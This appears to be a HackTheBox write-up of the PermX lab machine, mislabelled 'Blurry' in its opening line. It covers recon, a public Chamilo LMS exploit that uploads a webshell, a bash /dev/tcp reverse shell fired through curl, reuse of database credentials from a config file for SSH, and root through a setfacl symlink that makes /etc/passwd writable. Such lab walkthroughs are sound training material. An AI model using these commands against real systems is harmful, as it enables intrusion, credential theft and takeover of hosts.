This is my WriteUp for the medium difficulty Linux machine [Blurry](https://app.hackthebox.com/machines/PermX) on [HackTheBox Labs](https://app.hackthebox.com/).

## Recon
My first step was to scan with `nmap` the machine for open ports:
```shell
$ nmap -Pn -sV $LAB_IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```
There were only two open ports available:
- Port `22` - `ssh`
- Port `80` - `http` (Apache `httpd` web server on version `2.4.52`)

But for us interesting, is the web application on port `80`. I used `gobuster` to search the website for hidden files or directories:
```shell
$ gobuster dir -u "http://permx.htb" -w /usr/share/wordlists/dirb/big.txt

===============================================================
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]

/server-status        (Status: 403) [Size: 274]
===============================================================
```
At the first sight, I found nothing interesting, so I used `ffuf` to scan for subdomains.

Unfortunately, the domain has many empty subdomains, so I filtered the `http` response size with the `-fs` flag:
```shell
$ ffuf -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -c -fs 250-300

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 57ms]
---------------------------------------
```
I found the subdomain `lms.permx.htb` and on their is a service called **Chamilo**, which is a E-Learning & Collaboration-Software.

Again, I will execute `gobuster` to find interesting files/directories:
```shell
$ gobuster dir -u "http://lms.permx.htb" -w /usr/share/wordlists/dirb/big.txt

```
And indeed, `gobuster` found some interesting stuff. The `README.md` and `LICENSE`file looks like this is a typical `git` repository.

I looked into the `README.md` file and I found a version number: `1.11.x`

I researched for existing vulnerabilities and found a Proof of Concept (PoC) on [Github](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS) for the version `1.11.24`. We do not know if our web server is running a version below `1.11.24`, but  we can try to create a webshell with it. Therefore we can clone the `git` repository:
```shell
$ git clone https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS.git
$ cd CVE-2023-4220-Chamilo-LMS/
```
I executed the `main.py` script with our subdomain url `lms.permx.htb` and execute the action `scan` to check, if our Chamilo instance is vulnerable:
```shell
$ python3 main.py -u http://lms.permx.htb -a scan
```
The result indicated, that the instance of Chamilo is vulnerable, so we can try to execute the exploit and create a webshell with the `webshell` action:
```shell
$ python3 main.py -u http://lms.permx.htb -a webshell
```
The upload was successful and I was able to send commands to the webshell. I used that to create a reverse shell and therefore started my `netcat` listener on port `5555`:
```shell
nc -lnvp 5555
```
And then I URL encoded the following reverse shell command with [CyberChef](https://cyberchef.org): 
```shell
bash -c "/bin/bash -i >& /dev/tcp/10.10.14.151/5555 0>&1"
```

After everything was setup, I used `curl` to execute our reverse shell in our created webshell:
```shell
curl "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=bash%20%2Dc%20%22%2Fbin%2Fbash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E151%2F5555%200%3E%261%22"
```

It worked and I got a reverse shell! 

Now lets get a foothold.

---
## Foothold
The next step is to start and try to find a config file with useful information (like credentials). We can list the `/home/` directory for existing home directories. There I found the home directory for the user `mtz`.

The. I used a couple of times the [find](../../../../tools/linux/find.md) command to search for interesting files (for example for `sql`, `conf`, `db`):
```shell
$ find /var/www/chamilo/ -type f -name 'configuration.php'

/var/www/chamilo/app/config/configuration.php
/var/www/chamilo/plugin/sepe/src/configuration.php
```
It worked and inside the `configuration.php` file, I found at the first few lines interesting database credentials:
```php
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```
I tried to login with the user name`mtz` and the password `03F6lY3uXAP2bkW8` via `ssh`:
```shell
$ ssh mtz@permx.htb
Password: 03F6lY3uXAP2bkW8
```
And it worked!

We got our user flag!

---
## Privilege Escalation
Now the last step is to escalate our privileges and gain `root` access on the PermX machine.

Therefore my first step is to list all allowed commands that the user `mtz` can run with `sudo`:
```shell
$ sudo -l

(ALL : ALL) NOPASSWD: /opt/acl.sh
```
The output indicated, that we can run the script `/opt/acl.sh` with `root` privileges without a password.

The `/opt/acl.sh` mentioned looks like that:
```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
It uses the `setfacl` command, which sets Access Control Lists(ACLs) for files and directories. I used [GTFOBins](https://gtfobins.github.io/gtfobins/setfacl/) and found out, that there exists a privilege escalation method using a [writable `/etc/passwd`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd) file.

I could create a symbolic link of the `/etc/passwd` file to our home directory:
```shell
$ ln -s /etc/passwd /home/mtz/passwd_change
```

Then I used the `/opt/acl.sh` script to give our user `mtz` read and write permissions to the created symbolic link file `/home/mtz/passwd_change`:
```shell
$ sudo /opt/acl.sh mtz rw /home/mtz/passwd_change 
```

The last step was to append the user `hacker` with root permissions to the writable `passwd_change` file, which is just a symbolic link to the `/etc/passwd` file:
```shell
$ echo "hacker::0:0:hacker:/root:/bin/bash" >> ./passwd_change 
```

After that, I logged in as our created user `hacker` and had root access:
```shell
$ su hacker
``` 

It worked and I got the root flag.

## Exploit Chain
**Recon:**
1. Port scan with `nmap`
2. Find the `lms` subdomain with `ffuf`
3. Find the `README.md` file and get the version of the Chamilo LMS service
4. Research for Chamilo `1.11.x` vulnerabilities
5. Exploit the Chamilo LMS exploit, which creates a webshell
6. Use the webshell to start a reverse shell

**Foothold:**
7. Search the machine for configurations or sensitive files
8. Find a database credentials
9. Reuse the password with `ssh`

**Privilege Escalation:**
10. List allowed commands that `mtz` can run with `sudo`
11. Search for vulnerabilities in the `/opt/acl.sh` script
12. Abuse the writable `/etc/passwd` vulnerability to get a root shell
